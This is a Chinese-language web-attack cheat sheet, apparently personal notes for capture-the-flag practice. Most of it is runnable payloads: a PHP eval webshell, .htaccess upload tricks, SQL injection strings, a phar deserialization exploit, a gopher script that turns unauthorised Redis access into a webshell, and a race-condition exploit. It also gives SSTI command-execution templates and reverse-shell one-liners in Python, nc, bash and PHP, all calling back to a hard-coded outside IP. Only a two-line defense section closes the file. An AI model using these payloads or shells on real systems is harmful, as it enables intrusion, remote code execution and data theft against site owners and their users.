---
typora-copy-images-to: img
typora-root-url: ./
---

# WEB攻击



## 信息泄露

### .git泄露

```shell
python Githack.py xxxxxxxxxxxxx/.git
```

### 源码泄露&目录扫描

```
robots.txt
www.zip
www.tar.gz
index.php~ / .bak
phpmyadmin
```

扫描目录使用dirsearch

> pip install dirsearch 或者git clone https://github.com/maurosoria/dirsearch.git



## 常用弱密码

### 用户名

admin

administrator

root

### 密码

password

123456



## 文件上传

### apache

上传.htaccess文件执行php文件

```bash
# way1
AddType application/x-httpd-php .png
# way2
.htaccess
php_value auto_append_file .htaccess
#<?php phpinfo();
#way3
SetHandler application/x-httpd-php
```

### phtml

```php
<script language='php'>eval($_POST[mz]);</script>
```







## SQL注入

### MySQL

#### 联合注入

```sql
union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+
select group_concat(table_name) from information_schema.tables where table_schema='xxx'
select group_concat(column_name) from information_schema.columns where table_name='xxx'
```

#### 盲注

```sql
length(database())>=1
substr(database(),1,1)='t'
if(length(database())>1,sleep(5),1)
binary('a')-->控制大小写    # 或者使用ascii()好像也可
```

#### 一些绕过

```sql
# 用handler打开一个表的堆叠注入
1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#

```

### PostgreSQL

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md)

```sql

```





### sql写shell

https://www.cnblogs.com/KevinGeorge/p/8446874.html post





## php相关

### php伪协议

文件包含读源码：php://filter/read=convert.base64-encode/resource=index.php

php://fd/3 访问指定的文件描述符

php://input 访问请求的原始数据的只读流

新版本php可以用**多次软链接来绕过require_once**的判断：/proc/self/root/proc/self/root/.......

### phar伪协议

**phar反序列化：**

file_get_contents();自动反序列化phar://中meta-data储存的信息

*典型例题：[GXYCTF2019]BabysqliV3.0*

exp:

```php
<?php

class Uploader{
	public $Filename;
	public $cmd;
	public $token;
}

$a = new Uploader();
$a->Filename = "test";
$a->token = "GXYeb8a98c788e94834d92995b22bf05f07";
$a->cmd = 'highlight_file("/var/www/html/flag.php");';

echo serialize($a);

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
$phar->setMetadata($a); //将自定义meta-data存入manifest 这里存进的就是需要反序列化的对象
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
$phar->stopBuffering();
```

### pop链相关

个别特殊情况：

> 1. private成员变量有不可见字符需要用%00填充，在过滤%的情况下，可以使用\00来代替%00，同时，序列化中的小s需要改成大S
>
> 2. 还有一种情况就是php版本大于7.1，可以使用public代替private，不敏感。

反序列化配合**soap类**触发ssrf，使用如下：

```php
$target = 'http://127.0.0.1/flag.php';
$headers = array(
	'X-Forwarded-For: 127.0.0.1',
	'Cookie: PHPSESSID=mz12345678'
);
$b = new SoapClient(
	null,
	array(
		'location' => $target,
		'user_agent'=>"xxxx\r\n".join("\r\n",$headers),
		'uri'  => "xxx")
	);
```

### ssrf相关

curl 和 php_url_parse 处理地址后最终的目标不一样

0.0.0.0代表所有主机的ipv4地址绕过

#### gopher协议

一般是配合curl一起才能使用

协议格式：

```
URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
# gopher的默认端口是70
# 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&也需要进行URL编码
```

重要的端口: 6379(redis) 3306(mysql)

redis未授权写shell

```python
import urllib
from urllib.parse import quote
protocol="gopher://"
ip="10.0.114.11"      # 运行有redis的主机ip
port="6379"
shell="\n\n<?php system(\"cat /flag\");?>\n\n"
filename="shell.php"
path="/var/www/html"
passwd=""
cmd=["flushall",
	 "set 1 {}".format(shell.replace(" ","${IFS}")),
	 "config set dir {}".format(path),
	 "config set dbfilename {}".format(filename),
	 "save"
	 ]
if passwd:
	cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
	CRLF="\r\n"
	redis_arr = arr.split(" ")
	cmd=""
	cmd+="*"+str(len(redis_arr))
	for x in redis_arr:
		cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
	cmd+=CRLF
	return cmd

if __name__=="__main__":
	for x in cmd:
		payload += urllib.parse.quote(redis_format(x))
	print(payload)

```





### 条件竞争

文件包含：php中的session.upload_progress

exp:

```python
import io
import requests
import threading
sessid = 'TGAO'
data = {"cmd":"system('whoami');"}
def write(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( 'http://127.0.0.1:5555/test56.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )
def read(session):
    while True:
        resp = session.post('http://127.0.0.1:5555/test56.php?file=session/sess_'+sessid,data=data)
        if 'tgao.txt' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[+++++++++++++]retry")
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in xrange(1,30): 
            threading.Thread(target=write,args=(session,)).start()
            
        for i in xrange(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()
```



### php ssti

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```





## python相关

### flask ssti

检测：用{{7*7}}类似的语句去检测

相关语句：

```python
''.__class__.__bases__    # 查看基类 (<class 'object'>,)
"".__class__.__mro__    # 查看解析方法调用的顺序 (<class 'str'>, <class 'object'>)
"".__class__.__bases__[0].__subclasses__()    # 返回object子类的集合 不同的py版本返回的子类也不同
# <class 'os._wrap_close'> 是比较好利用的类
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__ # 查看类中比较好利用的方法
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('dir').read()  # 基本完整的利用流程

# 下面是一些特殊的
{{config}}    # 查看配置信息
{{()["__class__"]}}  # {{()["\x5f\x5fclass\x5f\x5f"]}}
{{()["__class__"]["__bases__"][0]["__subclasses__"]()[80]["load_module"]("os")["system"]("ls")}}     # 用<class '_frozen_importlib.BuiltinImporter'>这个去执行命令
{{()["__class__"]["__bases__"][0]["__subclasses__"]()[91]["get_data"](0, "app.py")}}     # 用<class '_frozen_importlib_external.FileLoader'>这个去读取文件
```

ssti查子类脚本：

```python
import re
_list = "".__class__.__bases__[0].__subclasses__()
_list = _list.split(',')
aim = [
"os._wrap_close",
'_frozen_importlib.BuiltinImporter',
'_frozen_importlib_external.FileLoader',
]


index = 0
for i in _list:
	tmp = str(i)
	for j in aim:
		p = re.findall(j, tmp)
		if len(p) != 0:
			print(f"find {j}, index = {index}")
	index += 1
```

利用POC：

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```







### flask session解密

由于存储在客户端所以可以被解密

> pip install flask-unsign
>
> flask-unsign --decode --cookie .xxxxxxxxxxxxxxxxxxxxxxx.xxxxxxxxx

```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' eyJsb2dnZWRfaW4iOnRydWV9.XDuW-g.cPCkFmmeB7qNIcN-ReiN72r0hvU
# 知道secret的情况下篡改session 
```









## node.js相关

### 原型链污染

参考p神博客：

https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html







## 反弹shell

### python

```shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("124.70.141.45",9998));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### nc

```shell
# 正向shell
nc -lvvp 9999 -e /bin/bash   
nc Rhost 9999                # hacker
# 反向shell
nc -e /bin/bash 124.70.141.45 9999
nc -lvvp 9999                # hacker
```

### bash

```shell
bash -i >& /dev/tcp/124.70.141.45/9998 0>&1
bash -c "bash -i >& /dev/tcp/124.70.141.45/9998 0>&1"
```

### php

```shell
php -r '$sock=fsockopen("124.70.141.45",9997);exec("/bin/sh -i <&3 >&3 2>&3");'
```



## JAVA

### 信息泄露

![20210225195910805](/img/20210225195910805.png)



## Misc

### cgi相关

走代理：

*例题：[V&N2020 公开赛]TimeTravel*

Proxy: 47.100.179.0:9999

然后在自己的服务器上返回数据

### csrf

```html
<script type="text/javascript">
    //自动点击
      document.getElementById("haha").click();
 </script>
```

### PHP session

绕过session auto start off:

```python
import requests

url = "http://0738e043-ba7b-441b-bb2d-cedf589d052f.node3.buuoj.cn/templates/login.php"

files = {"file": "123456789"}
a = requests.post(url=url, files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "qwer"},
                  cookies={"PHPSESSID": "qwer"}, params={'username': '1231234', 'password': '1231234'},
                  proxies={'http': "http://127.0.0.1:8080"})
print(a.text)
```

### phpmyadmin任意文件读取

[CVE-2018-12613（phpmyadmin远程文件包含漏洞）](https://www.xiinnn.com/article/e7c68814.html)

> phpmyadmin/index.php?target=db_datadict.php?/../../../../../flag



### tar打包相关命令

```bash
01-.tar格式
解包：[＊＊＊＊＊＊＊]$ tar xvf FileName.tar
打包：[＊＊＊＊＊＊＊]$ tar cvf FileName.tar DirName（注：tar是打包，不是压缩！）
02-.gz格式
解压1：[＊＊＊＊＊＊＊]$ gunzip FileName.gz
解压2：[＊＊＊＊＊＊＊]$ gzip -d FileName.gz
压 缩：[＊＊＊＊＊＊＊]$ gzip FileName

03-.tar.gz格式
解压：[＊＊＊＊＊＊＊]$ tar zxvf FileName.tar.gz
压缩：[＊＊＊＊＊＊＊]$ tar zcvf FileName.tar.gz DirName

04-.bz2格式
解压1：[＊＊＊＊＊＊＊]$ bzip2 -d FileName.bz2
解压2：[＊＊＊＊＊＊＊]$ bunzip2 FileName.bz2
压 缩： [＊＊＊＊＊＊＊]$ bzip2 -z FileName

05-.tar.bz2格式
解压：[＊＊＊＊＊＊＊]$ tar jxvf FileName.tar.bz2
压缩：[＊＊＊＊＊＊＊]$ tar jcvf FileName.tar.bz2 DirName

06-.bz格式
解压1：[＊＊＊＊＊＊＊]$ bzip2 -d FileName.bz
解压2：[＊＊＊＊＊＊＊]$ bunzip2 FileName.bz

07-.tar.bz格式
解压：[＊＊＊＊＊＊＊]$ tar jxvf FileName.tar.bz

08-.Z格式
解压：[＊＊＊＊＊＊＊]$ uncompress FileName.Z
压缩：[＊＊＊＊＊＊＊]$ compress FileName

09-.tar.Z格式
解压：[＊＊＊＊＊＊＊]$ tar Zxvf FileName.tar.Z
压缩：[＊＊＊＊＊＊＊]$ tar Zcvf FileName.tar.Z DirName

10-.tgz格式
解压：[＊＊＊＊＊＊＊]$ tar zxvf FileName.tgz

11-.tar.tgz格式
解压：[＊＊＊＊＊＊＊]$ tar zxvf FileName.tar.tgz
压缩：[＊＊＊＊＊＊＊]$ tar zcvf FileName.tar.tgz FileName
```



# 防御

php上流量监控脚本写日志

备份服务器